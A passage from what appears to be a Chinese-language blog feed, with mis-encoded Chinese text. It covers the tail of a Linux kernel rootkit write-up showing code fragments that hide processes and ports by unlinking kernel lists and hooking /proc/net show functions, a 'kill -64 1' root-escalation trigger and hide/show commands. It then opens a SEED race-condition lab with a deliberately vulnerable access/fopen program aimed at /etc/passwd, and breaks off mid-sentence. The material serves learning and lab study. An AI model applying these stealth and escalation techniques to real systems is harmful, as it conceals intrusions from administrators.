class="hljs-title">hide_list_header</span>=</span>LIST_HEAD_INIT(hide_list_header);<br><span class="hljs-comment">//è¿›ç¨‹éšè—çš„å­˜å‚¨ç»“ç‚¹</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hide_node</span>&#123;</span><br><span class="hljs-keyword">pid_t</span> <span class="hljs-keyword">pid_victim_t</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span>* <span class="hljs-title">task_use_t</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">hide_list_header_t</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨çš„å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">hide_pid_fn</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid_victim)</span></span>;<span class="hljs-comment">//éšè—è¿›ç¨‹</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">recover_pid_fn</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid_victim)</span></span>;<span class="hljs-comment">//æ¢å¤éšè—çš„è¿›ç¨‹</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">recover_pid_all</span><span class="hljs-params">()</span></span>;<span class="hljs-comment">//æ¢å¤æ‰€æœ‰è¿›ç¨‹</span><br></code></pre></td></tr></table></figure><p>å¤§è‡´çš„æµç¨‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">hide_pid_fn(<span class="hljs-keyword">pid_t</span> pid_victim);<br></code></pre></td></tr></table></figure><ul><li><p>æ ¹æ®pidç”¨find_vpid()æ‰¾åˆ°å¯¹åº”çš„pidç»“æ„ä½“</p></li><li><p>æˆåŠŸæ‰¾åˆ°pidç»“æ„ä½“ååˆ©ç”¨pid_task()æ‰¾åˆ°å¯¹åº”çš„task struct</p></li><li><p>åˆ©ç”¨é“¾è¡¨æ“ä½œå‡½æ•°hlist_del_rcuå¯¹task struct ç»“ç‚¹è¿›è¡Œè„±é“¾ï¼Œå¹¶ç”¨INIT_HLIST_NODEè®¾ç½®task struct çš„å‰åæŒ‡é’ˆ</p></li><li><p>ç„¶åæ ¹æ®task struct æ‰¾åˆ°å¯¹åº”çš„pid çš„ç»“ç‚¹ï¼Œåˆ©ç”¨hlist_del_rcuè¿›è¡Œè„±é“¾ï¼ŒINIT_HLIST_NODEè®¾ç½®å…¶æŒ‡é’ˆä¸ºç©ºï¼Œå¹¶å°†pprevæŒ‡å‘è‡ªèº«ã€‚</p></li></ul><p>æ­¤æ—¶è¿›ç¨‹å·²ç»æˆåŠŸæ‘˜é™¤é“¾è¡¨è¢«éšè—ï¼Œä½†æ˜¯éœ€è¦è®°å½•å¯¹åº”ç»“æ„ï¼Œæ–¹ä¾¿ä¹‹åæ¢å¤</p><ul><li>ç”¨kmallocç”³è¯·ä¸€ä¸ªhide_nodeç±»å‹ç»“ç‚¹çš„ç©ºé—´ï¼Œè®¾ç½®å¯¹åº”çš„pidå·å’Œtask structæŒ‡é’ˆï¼Œå¹¶é€šè¿‡list_headå°†å…¶å¢åŠ åˆ°hide_list_header é“¾è¡¨ä¸Šè¿›è¡Œè®°å½•</li></ul><p>åˆ°æ­¤å®Œæˆéšè—è¿›ç¨‹åŠŸèƒ½ï¼Œå¹¶æœªåé¢æ¢å¤åšå‡†å¤‡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">recover_pid_fn(<span class="hljs-keyword">pid_t</span> pid_victim);<br></code></pre></td></tr></table></figure><ul><li>é€šè¿‡list_for_each_entry_safeæ¥éå†hide_list_headeré“¾è¡¨ï¼Œç›´åˆ°æ‰¾åˆ°å’Œpidå¯¹åº”çš„hide_nodeçš„è¿›ç¨‹ã€‚ç„¶ååˆ©ç”¨hlist_add_head_rcuå°†pidé“¾å…¥å¯¹åº”çš„pidé“¾è¡¨ï¼Œåˆ©ç”¨list_add_tail_rcuå°†taské“¾å…¥å¯¹åº”çš„task structé“¾è¡¨</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">recover_pid_all(<span class="hljs-keyword">void</span>);<br></code></pre></td></tr></table></figure><ul><li>è¿™é‡ŒåŒæ ·é€šè¿‡list_for_each_entry_safeæ¥éå†hide_list_headeré“¾è¡¨</li><li>é’ˆå¯¹å…¶ä¸­çš„æ¯ä¸€ä¸ªéšè—çš„è¿›ç¨‹ï¼Œåˆ©ç”¨hlist_add_head_rcuå°†pidé“¾å…¥å¯¹åº”çš„pidé“¾è¡¨ï¼Œåˆ©ç”¨list_add_tail_rcuå°†taské“¾å…¥å¯¹åº”çš„task structé“¾è¡¨</li></ul><h1 id="ç«¯å£éšè—"><a href="#ç«¯å£éšè—" class="headerlink" title="ç«¯å£éšè—"></a>ç«¯å£éšè—</h1><blockquote><p>ç«¯å£éšè—å³éšè—å·²ç»è¢«ä½¿ç”¨çš„ç«¯å£ï¼Œåœ¨linuxä¸­æŸ¥çœ‹å·²ç»ä½¿ç”¨çš„ç«¯å£æœ‰ä¸¤ä¸ªå‘½ä»¤ï¼Œä¸€ä¸ªæ˜¯netstatï¼Œä¸€ä¸ªæ˜¯ssï¼Œä¸¤ä¸ªå‘½ä»¤è°ƒç”¨çš„ç³»ç»Ÿè°ƒç”¨ä¸åŒï¼Œå› æ­¤å®é™…éšè—çš„è¿‡ç¨‹ä¹Ÿä¸åŒ</p></blockquote><ul><li>netstatåœ¨è¯»å–ç«¯å£ä¿¡æ¯æ—¶ä¼šè¯»å–ä»¥ä¸‹å››ä¸ªæ–‡ä»¶ï¼ˆå¯¹åº”çš„ç½‘ç»œåè®®ä¸ºtcpã€udpã€tcp6ã€udp6ï¼‰ï¼š/proc/net/tcpã€/proc/net/udpã€/proc/net/tcp6/ã€/proc/net/udp6</li><li>è¿™å‡ ä¸ªæ–‡ä»¶éƒ½æ˜¯åºåˆ—æ–‡ä»¶ï¼Œå³seq_fileï¼Œseq_fileå®šä¹‰çš„ç»“æ„ä½“å¦‚ä¸‹</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> &#123;</span><br><span class="hljs-keyword">char</span> *buf; <span class="hljs-comment">//ç¼“å†²åŒº</span><br><span class="hljs-keyword">size_t</span> size;<br><span class="hljs-keyword">size_t</span> from;<br><span class="hljs-keyword">size_t</span> count; <span class="hljs-comment">//ç¼“å†²åŒºé•¿åº¦</span><br><span class="hljs-keyword">size_t</span> pad_until;<br><span class="hljs-keyword">loff_t</span> index;<br><span class="hljs-keyword">loff_t</span> read_pos;<br>u64 version;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">lock</span>;</span><br><span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> *<span class="hljs-title">op</span>;</span>  <span class="hljs-comment">// important</span><br><span class="hljs-keyword">int</span> poll_event;<br><span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span><br><span class="hljs-keyword">void</span> *<span class="hljs-keyword">private</span>;<br>&#125;;<br></code></pre></td></tr></table></figure><p>seq_operationså®šä¹‰çš„ç»“æ„ä½“ä¸º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> &#123;</span><br><span class="hljs-keyword">void</span> * (*start) (struct seq_file *m, <span class="hljs-keyword">loff_t</span> *pos);<br><span class="hljs-keyword">void</span> (*stop) (struct seq_file *m, <span class="hljs-keyword">void</span> *v);<br><span class="hljs-keyword">void</span> * (*next) (struct seq_file *m, <span class="hljs-keyword">void</span> *v, <span class="hljs-keyword">loff_t</span> *pos);<br><span class="hljs-keyword">int</span> (*show) (struct seq_file *m, <span class="hljs-keyword">void</span> *v);<br>&#125;;<br></code></pre></td></tr></table></figure><p>seq_operationsçš„showå‡½æ•°å³ä¸ºnetstatè¦è¾“å‡ºçš„ä¿¡æ¯ï¼Œæˆ‘ä»¬åªéœ€è¦å°†è¯¥å‡½æ•°çš„ hookæ‰ï¼Œåœ¨hookä¹‹å‰éœ€è¦å…ˆä¿å­˜showå‡½æ•°çš„åœ°å€ï¼Œå¯¹åº”çš„å‡½æ•°ä¸ºset_seq_opeartions</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">set_seq_operations</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* open_path,struct seq_operations** operations)</span></span>; <span class="hljs-comment">// open_pathæ˜¯æ‰“å¼€çš„åºåˆ—æ–‡ä»¶ï¼Œoperationsæ˜¯è¦ä¿å­˜çš„showå‡½æ•°çš„çœŸå®åœ°å€</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬åœ¨å…¨å±€å˜é‡ä¸­å£°æ˜äº†ä¸€ä¸ªé“¾è¡¨ï¼Œå˜é‡åä¸ºhidden_port_list_headï¼Œå®ƒçš„ä½œç”¨ä¸ºå­˜å‚¨éœ€è¦è¢«éšè—çš„ç«¯å£çš„ä¿¡æ¯ï¼Œå½“æƒ³éšè—ç«¯å£æ—¶ï¼Œè°ƒç”¨<strong>hide_connect</strong>å‡½æ•°ï¼Œå®ƒçš„å®šä¹‰ä¸º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">hide_connect</span><span class="hljs-params">(<span class="hljs-keyword">int</span> type, <span class="hljs-keyword">int</span> port)</span></span><br></code></pre></td></tr></table></figure><p>å…¶ä¸­typeä¸ºç½‘ç»œç±»å‹(tcp/udp/tcp6/udp6)ï¼Œportä¸ºç«¯å£å·ï¼Œè¯¥å‡½æ•°ä¼šå°†éœ€è¦éšè—çš„ç«¯å£æ·»åŠ åˆ°é“¾è¡¨ä¸Šã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">node = kmalloc(<span class="hljs-keyword">sizeof</span>(struct port_node), GFP_KERNEL);<br>node-&gt;port = port;<br>node-&gt;type = type;<br><br><span class="hljs-comment">// å‘é“¾è¡¨ä¸­æ·»åŠ èŠ‚ç‚¹</span><br>list_add_tail(&amp;node-&gt;<span class="hljs-built_in">list</span>, &amp;hidden_port_list_head);<br></code></pre></td></tr></table></figure><p>å½“ä¸æƒ³éšè—è¯¥ç«¯å£æ—¶ï¼Œä½¿ç”¨<strong>hide_unconnect</strong>å‡½æ•°å°†è¯¥èŠ‚ç‚¹ä»é“¾è¡¨ä¸­åˆ é™¤</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">unhide_connect</span><span class="hljs-params">(<span class="hljs-keyword">int</span> type, <span class="hljs-keyword">int</span> port)</span></span>&#123;<br>    list_for_each_entry_safe(entry, next_entry, &amp;hidden_port_list_head, <span class="hljs-built_in">list</span>)&#123;<br>        <span class="hljs-keyword">if</span> (entry-&gt;port == port &amp;&amp; entry-&gt;type == type)&#123;<br>            pr_info(<span class="hljs-string">&quot;Unhiding: %d&quot;</span>, port);<br>            list_del(&amp;entry-&gt;<span class="hljs-built_in">list</span>); <span class="hljs-comment">// å°†è¦éšè—çš„èŠ‚ç‚¹ä»é“¾è¡¨ä¸­åˆ é™¤</span><br>            kfree(entry);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>éšè—ç«¯å£çš„é“¾è¡¨ä¼šåœ¨æˆ‘ä»¬å®šä¹‰çš„hookå‡½æ•°ä¸­ç”¨åˆ°</p><p>é¦–å…ˆè¦è®©å®šä¹‰çš„hookå‡½æ•°çš„å‚æ•°ä¸éœ€è¦è¢«hookçš„å‡½æ•°å‚æ•°ç›¸åŒ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fake_seq_show</span><span class="hljs-params">(struct seq_file *seq, <span class="hljs-keyword">void</span> *v)</span></span><br></code></pre></td></tr></table></figure><p>hookå‡½æ•°é¦–å…ˆåˆ¤æ–­ç½‘ç»œç±»å‹ï¼Œä¹‹åè°ƒç”¨åŸshowå‡½æ•°ï¼Œå¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (seq-&gt;op == tcp_operations)&#123;<br>    type = TCP_CONNECT;<br>    <span class="hljs-comment">//è°ƒç”¨åŸæœ‰çš„tcp showå‡½æ•°</span><br>    ret = tcp_seq_fun(seq,v);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (seq-&gt;op == udp_operations)&#123;<br>    type = UDP_CONNECT;<br>    ret = udp_seq_fun(seq,v);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (seq-&gt;op == tcp6_operations)&#123;<br>    type = TCP6_CONNECT;<br>    ret = tcp6_seq_fun(seq,v);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (seq-&gt;op == udp6_operations)&#123;<br>    type = UDP6_CONNECT;<br>    ret = udp6_seq_fun(seq,v);<br>&#125;<br></code></pre></td></tr></table></figure><p>showå‡½æ•°ä¼šå°†éœ€è¦å±•ç¤ºçš„ç«¯å£ä¿¡æ¯æ”¾åœ¨seq-&gt;bufä¸­ï¼Œè€Œseq-&gt;countè®°å½•äº†bufçš„ç¼“å†²åŒºé•¿åº¦ï¼Œä»£ç çš„é€»è¾‘ä¸ºåˆ¤æ–­æ–°å¢çš„ç¼“å†²åŒºçš„å­—ç¬¦ä¸²æ˜¯å¦å’Œæƒ³è¦çš„éšè—çš„ç«¯å£ä¿¡æ¯ç›¸åŒï¼Œå¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// å¯¹hidden_port_list_headéå†</span><br>list_for_each_entry(node, &amp;hidden_port_list_head, <span class="hljs-built_in">list</span>)&#123;<br>    <span class="hljs-keyword">if</span> (type == node-&gt;type)&#123;<br>        <span class="hljs-comment">// seq-&gt;bufä¸ºç¼“å†²åŒº,snprintfå…ˆæŒ‰ç…§ç¼“å†²åŒºæ ¼å¼å£°æ˜ä¸€ä¸ªport_str_buf</span><br>        <span class="hljs-built_in">snprintf</span>(port_str_buf, PORT_STR_LEN, <span class="hljs-string">&quot;:%04X&quot;</span>, node-&gt;port);<br>        <span class="hljs-comment">// ä¹‹åå°†ç¼“å†²åŒºçš„æ–°å¢å­—ç¬¦ä¸²å’Œport_str_bufè¿›è¡Œå¯¹æ¯”åˆ¤æ–­æ˜¯å¦è¦è¿‡æ»¤ç«¯å£</span><br>        <span class="hljs-keyword">if</span> (strnstr(seq-&gt;buf + last_len, port_str_buf, this_len))&#123;<br>            pr_info(<span class="hljs-string">&quot;Hiding port: %d&quot;</span>, node-&gt;port);<br>            seq-&gt;count = last_len;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="åŠŸèƒ½æµ‹è¯•"><a href="#åŠŸèƒ½æµ‹è¯•" class="headerlink" title="åŠŸèƒ½æµ‹è¯•"></a>åŠŸèƒ½æµ‹è¯•</h1><p>æ¨¡å—ç¼–è¯‘ã€å®‰è£…ã€å¸è½½ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo make <br><br>sudo insmod rootkit.ko<br>   <br>sudo rmmod rootkit<br></code></pre></td></tr></table></figure><p>ææƒï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span><br><br><span class="hljs-attribute">kill</span> -<span class="hljs-number">64</span> <span class="hljs-number">1</span><br><br><span class="hljs-attribute">id</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/LaPhilosophie/hello-rootkit/main/image/%E6%8F%90%E6%9D%83.png"></p><p>æ¨¡å—éšè—ä¸æ¢å¤</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">echo hidemodule &gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br>echo showmodule &gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/LaPhilosophie/hello-rootkit/main/image/%E6%A8%A1%E5%9D%97%E9%9A%90%E8%97%8F%26%E6%81%A2%E5%A4%8D.png"></p><p>è¿›ç¨‹éšè—ä¸æ¢å¤</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">echo hideprocess [PID] &gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br>echo showprocess [PID] &gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/LaPhilosophie/hello-rootkit/main/image/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%26%E6%81%A2%E5%A4%8D.png"></p><p>æ–‡ä»¶éšè—ä¸æ¢å¤</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">echo hidefile [filename] &gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br>echo showfile [filename] &gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p><img src="https://github.com/LaPhilosophie/hello-rootkit/blob/main/image/%E6%96%87%E4%BB%B6%E9%9A%90%E8%97%8F&%E6%81%A2%E5%A4%8D.png?raw=true"></p><p>ç«¯å£éšè—ä¸æ¢å¤</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">echo hideport [port] &gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br>echo showport [port] &gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/LaPhilosophie/hello-rootkit/main/image/%E7%AB%AF%E5%8F%A3%E9%9A%90%E8%97%8F%26%E6%81%A2%E5%A4%8D.png"></p><p>å‚è€ƒèµ„æ–™</p><ul><li><a href="http://www.ouah.org/LKM_HACKING.html">(nearly) Complete Linux Loadable Kernel Modules</a></li><li><a href="https://github.com/milabs/awesome-linux-rootkits">awesome-linux-rootkits</a></li><li><a href="https://arttnba3.cn/2021/07/07/CODE-0X01-rootkit/">ç®€æ˜“ Linux rootkit ç¼–å†™å…¥é—¨æŒ‡åŒ—</a></li><li><a href="https://github.com/f0rb1dd3n/Reptile">Reptile</a></li><li><a href="https://github.com/ivyl/rootkit">Sample rootkit for Linux</a></li><li><a href="https://paper.seebug.org/1871/">ã€rootkit ç³»åˆ—ç ”ç©¶ã€‘rootkit æ£€æµ‹æŠ€æœ¯å‘å±•ç°çŠ¶</a></li><li><a href="https://github.com/plusls/rootkit">https://github.com/plusls/rootkit</a></li><li><a href="https://github.com/TangentHuang/ucas-rootkit">https://github.com/TangentHuang/ucas-rootkit</a></li><li><a href="https://xcellerator.github.io/posts/linux_rootkits_07/">https://xcellerator.github.io/posts/linux_rootkits_07/</a></li><li><a href="https://github.com/torvalds/linux/tree/325d0eab4f31c6240b59d5b2b8042c88f59405b5/fs">https://github.com/torvalds/linux/tree/325d0eab4f31c6240b59d5b2b8042c88f59405b5/fs</a></li><li><a href="https://docs-conquer-the-universe.readthedocs.io/zh_CN/latest/linux_rootkit/fundamentals.html">https://docs-conquer-the-universe.readthedocs.io/zh_CN/latest/linux_rootkit/fundamentals.html</a></li><li><a href="https://github.com/vkobel/linux-syscall-hook-rootkit">https://github.com/vkobel/linux-syscall-hook-rootkit</a></li><li><a href="https://linux.die.net/man/2/getdents64">https://linux.die.net/man/2/getdents64</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SEED-labï¼šRace Condition Vulnerability Lab</title>
    <link href="/p/529b2f3d/"/>
    <url>/p/529b2f3d/</url>
    
    <content type="html"><![CDATA[<h1 id="lab-setup"><a href="#lab-setup" class="headerlink" title="lab setup"></a>lab setup</h1><p>/tmpç›®å½•å…·æœ‰Sticky Bitï¼ˆSBITï¼‰ï¼Œå¯ä»¥çœ‹åˆ°æƒé™æ˜¯drwxrwxrwtï¼Œè¿™æ„å‘³ç€ä»»ä½•äººéƒ½å¯ä»¥åœ¨ /tmpå†…æ–°å¢ã€ä¿®æ”¹æ–‡ä»¶ï¼Œä½†ä»…æœ‰è¯¥æ–‡ä»¶/ç›®å½•å»ºç«‹è€…ä¸ root èƒ½å¤Ÿåˆ é™¤è‡ªå·±çš„ç›®å½•æˆ–æ–‡ä»¶</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">drwxrwxrwt</span>  <span class="hljs-number">24</span> root root <span class="hljs-number">4</span>.<span class="hljs-number">0</span>K Nov  <span class="hljs-number">1</span> <span class="hljs-number">20</span>:<span class="hljs-number">09</span> tmp/<br></code></pre></td></tr></table></figure><p>Linuxçš„ä¿æŠ¤æœºåˆ¶ï¼š</p><ul><li>â€œsymlinks in world-writable sticky directories (e.g./tmp) cannot be followed if the follower and directory owner do not match the symlink owner.â€</li><li>prevents the root from writing to the files in /tmp that are owned by others. In this lab, we need to disable these protections.</li></ul><p>å…·ä½“å¯ä»¥å‚è§ï¼š<a href="https://wiki.ubuntu.com/Security/Features#Symlink_restrictions">https://wiki.ubuntu.com/Security/Features#Symlink_restrictions</a></p><p>Stack Overflowä¸Šä¹Ÿæœ‰ç±»ä¼¼çš„é—®é¢˜ï¼š<a href="https://unix.stackexchange.com/questions/355033/permissions-of-symlinks-inside-tmp">https://unix.stackexchange.com/questions/355033/permissions-of-symlinks-inside-tmp</a></p><p>ä¸ºäº†å®éªŒçš„æ­£å¸¸è¿›è¡Œï¼Œå…³é—­ä¿æŠ¤æœºåˆ¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo sysctl -w fs.protected_symlinks=0</span><br><span class="hljs-meta">$</span><span class="bash"> sudo sysctl fs.protected_regular=0</span><br></code></pre></td></tr></table></figure><p>ä¸€ä¸ªå®¹æ˜“å—åˆ°æ”»å‡»çš„ç¨‹åºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span>* fn = <span class="hljs-string">&quot;/tmp/XYZ&quot;</span>;<br>    <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">60</span>];<br>    FILE* fp;<br><br>    <span class="hljs-comment">/* get user input */</span><br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%50s&quot;</span>, buffer);<br><br>    <span class="hljs-keyword">if</span> (!access(fn, W_OK)) &#123;<br>        fp = fopen(fn, <span class="hljs-string">&quot;a+&quot;</span>);<br>        <span class="hljs-keyword">if</span> (!fp) &#123;<br>            perror(<span class="hljs-string">&quot;Open failed&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>        fwrite(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>), <span class="hljs-number">1</span>, fp);<br>        fwrite(buffer, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>), <span class="hljs-built_in">strlen</span>(buffer), fp);<br>        fclose(fp);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No permission \n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>access() system call checks if the Real User ID has write access to /tm/X.After the check, the file is opened for writing</li><li>open() checks the effective user id which is 0 and hence file will be opened</li><li>rootç”¨æˆ·å¯ä»¥åœ¨ä»»æ„æ–‡ä»¶æ‰§è¡Œå†™æ“ä½œ</li></ul><p><img src="/image/racecondition.png"></p><h1 id="Task-1-Choosing-Our-Target"><a href="#Task-1-Choosing-Our-Target" class="headerlink" title="Task 1: Choosing Our Target"></a>Task 1: Choosing Our Target</h1><p>åœ¨<code>/etc/passwd</code>æ–‡ä»¶ä¸­ï¼Œæ¯ä¸ªç”¨æˆ·éƒ½æœ‰ä¸€ä¸ªæ¡ç›®ï¼ˆè¡Œï¼‰ï¼Œç”¨å†’å·(:)åˆ†éš”çš„ä¸ƒä¸ªå­—æ®µç»„æˆã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªæ —å­ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">root:x:0:0:root:/root:/bin/bash<br></code></pre></td></tr></table></figure><p>ä»å·¦åˆ°å³åˆ†åˆ«æ˜¯ï¼š</p><ul><li>ç”¨æˆ·å</li><li>å¯†ç </li><li>User ID </li><li>Group ID</li><li>æ³¨é‡Š</li><li>home directory</li><li>ç”¨æˆ·ç™»å½•åæ‰§è¡Œçš„å‘½ä»¤</li></ul><p>å¯†ç 